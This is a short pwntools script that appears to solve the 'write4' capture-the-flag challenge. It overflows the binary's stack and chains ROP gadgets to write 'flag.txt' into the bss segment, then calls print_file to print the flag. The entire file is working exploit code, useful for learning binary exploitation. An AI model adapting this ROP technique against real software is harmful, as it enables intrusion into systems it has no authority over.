from pwn import *

context.binary = './write4'

# All the gadgets we found
write_to = p64(0x400628)  # mov qword ptr [r14], r15; ret
pop_r14_r15 = p64(0x400690)  # pop r14; pop r15; ret
pop_rdi = p64(0x400693)  # pop rdi; ret
loc_to_write = p64(0x0000000000601038) # bss segment
print_file = p64(0x400510) # print_file@plt
aligner = p64(0x4004e6) # ret;

offset = b'A'*40

# Building the payload (just like it would look in the actual stack)
payload = [
 offset,
 pop_r14_r15,
 loc_to_write,   # This will be r14 (the location to write to)
 b'flag.txt',
 write_to,
 pop_rdi,
 loc_to_write,
 aligner,
 print_file
]

# Joining everything together to make the final exploit
payload = b"".join(payload)

# Setting the target binary
target = process(['./write4'])

# Sending the exploit
target.sendline(payload)

# Printing the flag
print(target.recvall().decode('utf-8'))
